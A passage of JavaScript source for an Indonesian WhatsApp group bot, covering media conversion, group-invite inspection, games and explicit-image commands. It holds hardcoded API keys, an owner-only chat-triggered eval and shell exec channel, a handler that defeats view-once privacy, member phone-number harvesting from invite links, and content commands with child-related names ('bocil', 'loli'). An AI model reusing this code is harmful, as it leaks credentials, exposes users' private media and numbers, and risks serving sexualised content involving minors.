            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            mimetype : 'audio/mp4',
            ptt : true,
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            ALDI.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
            }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await ALDI.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ALDI.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            mimetype : 'video/mp4',
            contextInfo: { mentionedJid: mem },
            quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            ALDI.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
            } else{
            reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
            }
            break
            case 'tomp4':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await ALDI.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            reply('reply stiker')
            }
            fs.unlinkSync(owgi)
            break
            case 'tourl':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
           
            if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await ALDI.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break
//====================[ MAKER MENU ]===========================\\
            case 'imgtourl':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)
            reply(mess.wait)
            var encmedia  = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            var jnckk = await  ALDI.downloadAndSaveMediaMessage(encmedia)
            var imgbb = require('imgbb-uploader')
            imgbb('3b8594f4cb11895f4084291bc655e510', jnckk)
            .then(data => {
            var caps = `
????????? IMGBB TO URL ???
???
?????? ID : ${data.id}
?????? MimeType : ${data.image.mime}
?????? Extension : ${data.image.extension}
???
?????? URL : ${data.display_url}
??????????????????????????????????????????????????????????????????`
            ibb = fs.readFileSync(jnckk)
            ALDI.sendMessage(from, ibb, image, { quoted: ftroli, caption: caps })
            })
            .catch(err => {
            throw err 
            })
            break
            case 'inspect':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			            
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await ALDI.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
            par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
            jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
            }
            jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
            jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
            ALDI.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
            } catch {
            reply('Link error')
            }
            break
//========================[ CASE GAME ]==========================\\            
            case  'tictactoe':
            case 'ttc':
            if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
            if (!isGroup) return reply(mess.group)

            if (fs.existsSync(`./lib/tictactoe/db/${from}.json`)) {
            const boardnow = setGame(`${from}`);
            const matrix = boardnow._matrix;
            const chatMove = `
T i c t a c t o e  G a m e..
Sedang ada sesi permainan digrup ini!!

Info :

Player ??? : @${boardnow.X}
Player ??? : @${boardnow.O}

${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}

${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}

Giliran @${boardnow.turn == "X" ? boardnow.X : boardnow.O}
Ketik nyerah untuk Menyerah..
Ketik ${prefix}delttc untuk menghapus session Game..`;
           ALDI.sendMessage(from, monospace(chatMove), MessageType.text, {
quoted: mek,
contextInfo: {
mentionedJid: [
  boardnow.X + "@s.whatsapp.net",
  boardnow.O + "@s.whatsapp.net",
  ],
  },
 });
return;
           }
           if (argss.length === 1)
return reply(`Tag yang ingin jadi lawan anda!\n\nPenggunaan : *${prefix}tictactoe @TagMember*`);
           const boardnow = setGame(`${from}`);

           console.log(`Start Tictactore ${boardnow.session}`);
           boardnow.status = false;
           boardnow.X = sender.replace("@s.whatsapp.net", "");
           boardnow.O = argss[1].replace("@", "");
           fs.writeFileSync(`./lib/tictactoe/db/${from}.json`,JSON.stringify(boardnow, null, 2));
           const strChat = `
T i c t a c t o e  G a m e..

@${sender.replace("@s.whatsapp.net","")} 
menantang ${argss[1]} untuk Menjadi lawan Game!!
     


${argss[1]}  Ketik Y/N 


Note : 
  
??? N : menolak tantangan..
  
??? Y : Terima tantangan..`;
            ALDI.sendMessage(from, monospace(strChat), MessageType.text, {
quoted: mek,
contextInfo: {
mentionedJid: [sender, argss[1].replace("@", "") + "@s.whatsapp.net"],
 },
});
            gameAdd(sender, glimit)
            break
                    

            case  'delttc':

            if (!isGroup) return reply(mess.only.group)
            if (fs.existsSync("./lib/tictactoe/db/" + from + ".json")) {
            fs.unlinkSync("./lib/tictactoe/db/" + from + ".json");
            reply(`Berhasil menghapus sesi di grup ini!`);

            } else {
            reply(`Tidak ada sesi yg berlangsung, mohon ketik ${prefix}tictactoe`);
 
            }
break
                  
            case 'tebakgambar':{
            if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
            if (!isGroup) return reply(mess.group)
            if (game.isTebakGambar(from, tebakgambar)) return reply(`Masih ada soal yang belum di selesaikan`)
            let tbg = await axios.get(`https://api.zeks.xyz/api/tebakgambar?apikey=${zeks}`)
            const petunjuk = tbg.data.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
            sendMediaURL(from, tbg.data.result.soal, monospace(`Silahkan jawab soal berikut ini\n\nPetunjuk : ${petunjuk}\nWaktu : ${gamewaktu}s`), mek)

            let anih = tbg.data.result.jawaban.toLowerCase()
game.addgambar(from, anih, gamewaktu, tebakgambar)
            gameAdd(sender, glimit)
            }
            break
            case 'caklontong':{
            if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
            if (!isGroup) return reply(mess.group)
            if (game.isCkl(from, ckl)) return reply(`Masih ada soal yang belum di selesaikan`)
            let anu = await axios.get(`https://lindow-api.herokuapp.com/api/kuis/caklontong?apikey=LindowApi`)
            const petunjuk = anu.data.result.jawaban.replace(/[a|b|c|d|e|f|g|h|i|j|k|l|m|n|o|p|q|r|s|t|u|v|w|x|y|z]/gi, '_')
            reply(`*Soal :*\n_${anu.data.result.soal}_\n*Petunjuk :* ${petunjuk}\n\nWaktu : ${gamewaktu}s`)
            let anih = anu.data.result.jawaban.toLowerCase()
            game.addckl(from, anih, gamewaktu, ckl)
            gameAdd(sender, glimit)
            }
            break
						
           
case 'math':{
            if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
            if (!isGroup) return reply(mess.group)
            if (game.isMtk(from, mtk)) return reply(`Masih ada soal yang belum di selesaikan`)
            if (!q) return reply(`*Mode tersedia :*\n1. very_easy\n2. easy\n3. medium\n4. hard\n5. extreme\n6. impossible\n\n_Example : ${prefix + command} hard_`)
            let anu = await axios.get(`http://zekais-api.herokuapp.com/math?mode=${q}`)
            //	const petunjuk = anu.data.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
            reply(`*Soal :*\n_${anu.data.nilai_1} ${anu.data.tanda} ${anu.data.nilai_2} :_\nWaktu : ${gamewaktu}`)
            let anih = anu.data.jawaban.toLowerCase()
            game.addmtk(from, anih, gamewaktu, mtk)
            gameAdd(sender, glimit)
            }
            break

            case 'family100':{
            if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
            if (!isGroup) return reply(mess.group)
            if (game.isfam(from, family100)) return reply(`Masih ada soal yang belum di selesaikan`)
            let anu = await axios.get(`http://api.lolhuman.xyz/api/tebak/family100?apikey=${LolKey}`)
            reply(`*JAWABLAH SOAL BERIKUT*\n\n*Soal :* ${anu.data.result.question}\n*Total Jawaban :* ${anu.data.result.aswer.length}\n\nWaktu : ${gamewaktu}s`)
            let anoh = anu.data.result.aswer
            let rgfds = []
for (let i of anoh){
            let fefs = i.split('/') ? i.split('/')[0] : i
            let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs
            let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
rgfds.push(axsf.toLowerCase())
 
            }
            game.addfam(from, rgfds, gamewaktu, family100)
            gameAdd(sender, glimit)
            }
            break

//========================[ BATAS GAME ]==========================\\            
            
			case 'nhentaipdf':
		    
			if (args.length == 0) return reply(`Example: ${prefix + command} 12345`)
			
			henid = args[0]
			
			get_result = await fetchJson(`http://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${LolKey}`)
			
			get_result = get_result.result
			
			ini_buffer = await getBuffer(get_result)
			
			ALDI.sendMessage(from, ini_buffer, document, { quoted: mek, mimetype: Mimetype.pdf, filename: `${henid}.pdf` })
			
			break
            
			case 'nhentaisearch':
           
		    if (args.length == 0) return reply(`Example: ${prefix + command} Gotoubun No Hanayome`)
			
		    query = args.join(" ")
			
		    get_result = await fetchJson(`http://api.lolhuman.xyz/api/nhentaisearch?apikey=${LolKey}&query=${query}`)
			
		    get_result = get_result.result
			
		    ini_txt = "Result : \n"
			
		    for (var x of get_result) {
			
		    ini_txt += `Id : ${x.id}\n`
			
		    ini_txt += `Title English : ${x.title_english}\n`
			
		    ini_txt += `Title Japanese : ${x.title_japanese}\n`
			
		    ini_txt += `Native : ${x.title_native}\n`
			
		    ini_txt += `Upload : ${x.date_upload}\n`
			
		    ini_txt += `Page : ${x.page}\n`
			
		    ini_txt += `Favourite : ${x.favourite}\n\n`
			
		    }
			
		    reply(ini_txt)
			
		    break
			// Random Image //

			case 'art':

			case 'bts':
			
			case 'exo':
			
			case 'elf':
		
			case 'loli':
			case 'waifu':
			
			case 'neko':
					
			case 'shota':
					
			case 'sagiri':
			
			case 'shinobu':
			
			case 'megumin':
			
			case 'wallnime':
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
            limitAdd(sender, limit)			
			buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/${command}?apikey=${LolKey}`)
			//ALDI.sendMessage(from, buffer, image, { quoted: mek})			
			ALDI.sendMessage(from, buffer, image, { thumbnail: cewe, caption: `*nih kak*`, quoted: ftroli})
			break

			case 'chiisaihentai':
			case 'trap':
			case 'blowjob':
			case 'yaoi':
			case 'ecchi':
			case 'hentai':

			case 'ahegao':

			case 'hololewd':
			case 'sideoppai':
			case 'animefeets':

			case 'animebooty':

			case 'animethighss':
			case 'hentaiparadise':

			case 'animearmpits':
			case 'hentaifemdom':
			case 'lewdanimegirls':
			case 'biganimetiddies':
			case 'animebellybutton':
			case 'hentai4everyone':
            if (!isPremium) return reply(`Kamu bukan user premium`)
			ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${LolKey}`)
			ALDI.sendMessage(from, ini_buffer, image, { thumbnail: cewe, caption: `*nih kak*`, quoted: ftroli})
			break
			case 'tahta': case 'hartatahta':
			if (args.length == 0) return reply(`contoh: ${prefix + command} NAY`)
            teks = args.join(" ")
            ini_buf = await getBuffer(`https://zuxyapi.herokuapp.com/api/maker/harta-tahta?apikey=${ZuxyKey}&text=${teks}`)
            ALDI.sendMessage(from, ini_buf, image, { thumbnail: cewe, caption: `*nih kak jangan lupa follow ig @zuxyganz_*`, quoted: ftroli})
            break
            
           /* case 'nulis': case 'nulisbuku':
            
            if (args.length == 0) return reply(`contoh: ${prefix + command} NAY`)
            teks = args.join(" ")
            ini_buf = await getBuffer(`https://zuxyapi.herokuapp.com/api/maker/nulis?apikey=${ZuxyKey}&text=${teks}`)
            
            ALDI.sendMessage(from, ini_buf, image, { thumbnail: cewe, caption: `*nih kak jangan lupa follow ig @zuxyganz_*`, quoted: ftroli})
            break*/
 /*           case 'nulis':
            reply(`*Pilihan*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`)
            break
            case 'nuliskiri':{
                
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (args.length < 2) return reply(`Kirim perintah *${prefix}nuliskiri* teks`)
            reply(mess.wait)
            const tulisan = body.slice(11)
            const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
            const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
            spawn('convert', ['./image/nulis/images/buku/sebelumkiri.jpg', '-font', './image/nulis/font/Indie-Flower.ttf','-size','960x1280','-pointsize','22','-interline-spacing','2','-annotate','+140+153',fixHeight, './image/nulis/images/buku/setelahkiri.jpg'])
            .on('error', () => reply(mess.error))
            .on('exit', () => {
            ALDI.sendMessage(from, fs.readFileSync('./image/nulis/images/buku/setelahkiri.jpg'), image, {quoted: ftroli, caption: `Jangan malas om????...`})
            limitAdd(sender, limit)
            })
            }
            break
            case 'nuliskanan':{
                
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                
            if (args.length < 2) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)
                
            reply(mess.wait)
                
            const tulisan = body.slice(12)
                
            const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
                
            const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                
            spawn('convert', ['./image/nulis/images/buku/sebelumkanan.jpg','-font','./image/nulis/font/Indie-Flower.ttf','-size','960x1280','-pointsize','23','-interline-spacing','2','-annotate', '+128+129',fixHeight,'./image/nulis/images/buku/setelahkanan.jpg'])
                
            .on('error', () => reply(mess.error))
               
            .on('exit', () => {
                    
            ALDI.sendMessage(from, fs.readFileSync('./image/nulis/images/buku/setelahkanan.jpg'), image, {quoted: ftroli, caption: `Jangan malas pak...`})
                    
            limitAdd(sender, limit)
                
            })
            
            }
                
            break
            
            case 'foliokiri':{
                
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                
            if (args.length < 2) return reply(`Kirim perintah *${prefix}foliokiri* teks`)
                
            reply(mess.wait)
                
            const tulisan = body.slice(11)
                
            const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
                
            const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                
            spawn('convert', ['./image/nulis/images/folio/sebelumkiri.jpg','-font','./image/nulis/font/Indie-Flower.ttf','-size','1720x1280','-pointsize','23','-interline-spacing','4','-annotate','+48+185',fixHeight,'./image/nulis/images/folio/setelahkiri.jpg'])
            .on('error', () => reply(mess.error))
                
            .on('exit', () => {
                    
            ALDI.sendMessage(from, fs.readFileSync('./image/nulis/images/folio/setelahkiri.jpg'), image, {quoted: ftroli, caption: `Jangan malas pak...`})
            limitAdd(sender, limit)
            })
            }
            break
            case 'foliokanan':{
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (args.length < 2) return reply(`Kirim perintah *${prefix}foliokanan* teks`)
            reply(mess.wait)
            const tulisan = body.slice(12)
            const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')

            const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
            spawn('convert', ['./image/nulis/images/folio/sebelumkanan.jpg','-font','./image/nulis/font/Indie-Flower.ttf','-size','960x1280','-pointsize','23','-interline-spacing','3','-annotate','+89+190',fixHeight,'./image/nulis/images/folio/setelahkanan.jpg'])
            .on('error', () => reply(mess.error))
            .on('exit', () => {
            ALDI.sendMessage(from, fs.readFileSync('./image/nulis/images/folio/setelahkanan.jpg'), image, {quoted: ftroli, caption: `Jangan malas pak...`
            })
            limitAdd(sender, limit)
                
            })
            
            }
                
            break*/                        
            case '+62':
            if (!isPremium) return reply(`Kamu bukan user premium`)
            reply(mess.wait)
            sendMediaURL(from,`https://dapuhy-api.herokuapp.com/api/asupan/asupan?apikey=Ltx1Oe39RFQjBjz`)
            break

            case 'santuy':
            if (!isPremium) return reply(`Kamu bukan user premium`)
            reply(mess.wait)
            sendMediaURL(from,`https://dapuhy-api.herokuapp.com/api/asupan/asupansantuy?apikey=Ltx1Oe39RFQjBjz`)
            break
            case 'bocil':
            if (!isPremium) return reply(`Kamu bukan user premium`)
            reply(mess.wait)
            sendMediaURL(from,`https://dapuhy-api.herokuapp.com/api/asupan/asupanbocil?apikey=Ltx1Oe39RFQjBjz`)
            break
            case 'ukhti':
            if (!isPremium) return reply(`Kamu bukan user premium`)
            reply(mess.wait)
            sendMediaURL(from,`https://dapuhy-api.herokuapp.com/api/asupan/asupanukhty?apikey=Ltx1Oe39RFQjBjz`)
            break
            case 'rikagusriani':
            if (!isPremium) return reply(`Kamu bukan user premium`)
            reply(mess.wait)
            sendMediaURL(from,`https://dapuhy-api.herokuapp.com/api/asupan/asupanrikagusriani?apikey=Ltx1Oe39RFQjBjz`)
            break
            case 'ghea':
            if (!isPremium) return reply(`Kamu bukan user premium`)
            reply(mess.wait)
            sendMediaURL(from,`https://dapuhy-api.herokuapp.com/api/asupan/asupanghea?apikey=Ltx1Oe39RFQjBjz`)
            break
           
            case 'bucinstick':
            case 'bucinsticker':{
        
            if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                    
            var ano = await fetchText('https://raw.githubusercontent.com/rashidsiregar28/data/main/bucin')
                    
            var wifegerak = ano.split('\n')
                    
            var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
                    
            sendStickerUrl(from, wifegerakx, mek)
             		
            limitAdd(sender, limit)
                    
            }
                    
            break
            case "q":
            if (!m.quoted) return reply("reply message!");
            let qse = ALDI.serializeM(await m.getQuotedObj());
            if (!qse.quoted)
            return reply("the message you replied does not contain a reply!");
            await qse.quoted.copyNForward(m.chat, true);           
            break 
            case 'katalog1':
            let pap = ALDI.prepareMessageFromContent(from, {
            
listMessage: {
            
productListInfo: {
            
businessOwnerJid: "6287727925499@s.whatsapp.net", // nomor busines
            
headerImage: {
            
jpegThumbnail: fs.readFileSync('./image/cewe.jpeg', { encoding: "base64" }), // image to produk
            
productId: "5896288457111763" // produk id
            
},
            
productSections: [{ products: 
[{productId: "5896288457111763"}], 
            
title: 'WIBU' //this is the title 
            
}]
},
buttonText: "Hello world",
description: "INI TEST KAK", //ini adalah list menu nya
            
footerText: "Made with By\nAWANG", //this is footer text
           
listType: 2
            
}
            
}, 
            
{});
            
await ALDI.relayWAMessage(pap);
break
default:
	    if (isGroup && !mek.key.fromMe && isAntiLink) {
        if (budy.includes("chat.whatsapp.com")) {
        if (!isGroup) return
	    if (!isAntiLink) return
		if (isGroupAdmins) return reply('*_Kerana Kamu Admin bot Tidak Akan Di Kick*')
		ALDI.updatePresence(from, Presence.composing)
		if (messagesCC.includes("#izinmin")) return reply("izin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*??? Link Group Terdeteksi ???*${sender.split("@")[0]} Bot Akan Kick Kamu Bye Bye`)
		setTimeout( () => {
		ALDI.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 3000)
		console.log(color('LINKGROUP TERDETEKSI'))
		}
		}
	    if (isGroup && !mek.key.fromMe && isAntiLink) {		
	    if (budy.includes('jasa','sewa','akun','harga','jual','open')) {
        if (!isGroup) return
	    if (!isjasa) return
		if (isGroupAdmins) return reply('*_Kerana Kamu Admin bot Tidak Akan Di Kick*')
		ALDI.updatePresence(from, Presence.composing)
		if (messagesCC.includes("#izinmin")) return reply("izin diterima")
		var kic = `${sender.split("@")[0]}@s.whatsapp.net`
		reply(`*??? jualan:v ???${sender.split("@")[0]} Bot Akan Kick Kamu Bye Bye*`)
		setTimeout( () => {
		ALDI.groupRemove(from, [kic]).catch((e)=>{reply(`*ERR:* ${e}`)})
		}, 3000)
		console.log(color('jualan terdeteksi'))
		}
		}		
// function ANTI viewOnce


if (isGroup && isAntiVO && m.mtype == 'viewOnceMessage'){
var msg = {...mek}

let typenya = msg.message.viewOnceMessage.message["videoMessage"] ?
msg.message.viewOnceMessage.message.videoMessage : msg.message.viewOnceMessage.message.imageMessage
        
typenya["viewOnce"] = false
            
typenya["caption"] = `\`\`\`Anti-ViewOnce\n\n\nCaption : ${(typenya.caption === '') ? 'NONE' : typenya.caption}\`\`\``
            
let peq = msg.message.viewOnceMessage.message["imageMessage"] ? { key: { fromMe: false, participant: sender, id: mek.key.id }, message: {"viewOnceMessage": {"message": { "imageMessage" : {"viewOnce": true } } } } } :  { key: { fromMe: false, participant: sender, id: mek.key.id }, message: {"viewOnceMessage": {"message": { "imageMessage" : {"viewOnce": true } } } } }
            
let pe = await ALDI.prepareMessageFromContent(from, msg.message.viewOnceMessage.message, {quoted: peq})
            
await ALDI.relayWAMessage(pe)
}


if (chats.startsWith('>')){
			
if(!mek.key.fromMe && !isOwner) return
				
console.log(color('[EVAL]'), color(moment(mek.messageTimestamp * 1000).format('HH:mm:ss'), 'yellow'), color(`Eval V2 brooo`))
				
try{
reply(require('util').format(await eval(`;(async () => { ${chats.slice(2)} })()`)))
}catch(err){
	e = String(err)
reply(e)
	
}

}

if (budy.startsWith('x')){

try {
if (!mek.key.fromMe && !isOwner) return reply('```khusus owner bro```')

return ALDI.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})

} 
catch(err) {
e = String(err)

reply(e)

}

}  

        
if (budy.startsWith("$ ")){
if (!mek.key.fromMe && !isOwner) return reply('```khusus owner bro```')
           	console.log(color('[EXEC]'), color(moment(mek.messageTimestamp * 1000).format('HH:mm:ss'), 'yellow'), color(`Dari owner ni`))
           	exec(chats.slice(2), (err, stdout) => {
           	if (err) return reply(`${err}`)
           	if (stdout) reply(`${stdout}`)
           	})
            }
if (budy.startsWith('=>')){
if (!isOwner && !mek.key.fromMe) return reply('khusus owner bro')
var konsol = budy.slice(3)
Return = (sul) => {
var sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined){
bang = util.format(sul)
}
return reply(bang)
}
try {
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color(">", "green"), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
} catch(e){
  reply(String(e))
}
}  

	}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'red'), 'SELF-MODE', color(sender.split('@')[0]))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero") && !e.includes("jid")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}


	
    
